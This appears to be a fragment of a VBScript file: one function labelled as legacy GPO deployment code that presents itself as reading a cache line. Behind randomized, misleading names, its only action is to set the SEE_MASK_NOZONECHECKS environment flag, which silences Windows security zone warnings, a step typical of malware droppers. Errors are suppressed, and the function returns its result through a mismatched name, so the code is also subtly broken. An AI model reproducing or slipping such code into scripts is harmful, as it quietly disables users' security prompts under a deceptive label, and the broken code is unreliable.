' --- matches legacy GPO deployment ---
Function ReadCacheLine69()
On Error Resume Next
  Dim strLine54,blnExists46,strSegment551
  Set strLine54=CreateObject("WScript.Shell")
  blnExists46=strLine54.ExpandEnvironmentStrings("%TEMP%")
  strSegment551=strLine54.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(blnExists46)>0 And Len(strSegment551)>0 Then
    strLine54.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest22=1
    Exit Function
  End If
  DecodeManifest22=0
End Function

